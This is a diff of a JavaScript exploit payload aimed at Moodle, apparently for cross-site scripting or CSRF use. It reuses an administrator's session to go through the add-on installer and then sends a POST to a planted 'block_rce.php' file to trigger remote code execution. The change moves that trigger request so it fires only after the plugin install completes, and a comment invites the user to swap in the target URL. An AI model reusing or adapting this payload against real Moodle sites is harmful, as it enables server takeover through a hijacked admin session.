@@ -1,7 +1,4 @@
-const Http = new XMLHttpRequest();  
 const URL = "https://daviddoaa.me/moodle/"; // Change this to your target URL 
-Http.open("POST", URL + "blocks/rce/lang/en/block_rce.php?token=mail");
-Http.send();
   fetch(URL + "admin/tool/installaddon/index.php", {
     credentials: "include",
   })
@@ -101,7 +98,9 @@ Http.send();
                       credentials: "include",
                     }
                   ).then(() => {
-                    
+                    const Http = new XMLHttpRequest(); 
+                      Http.open("POST", URL + "blocks/rce/lang/en/block_rce.php?token=mail");
+                      Http.send();
                   });
                 });
             });
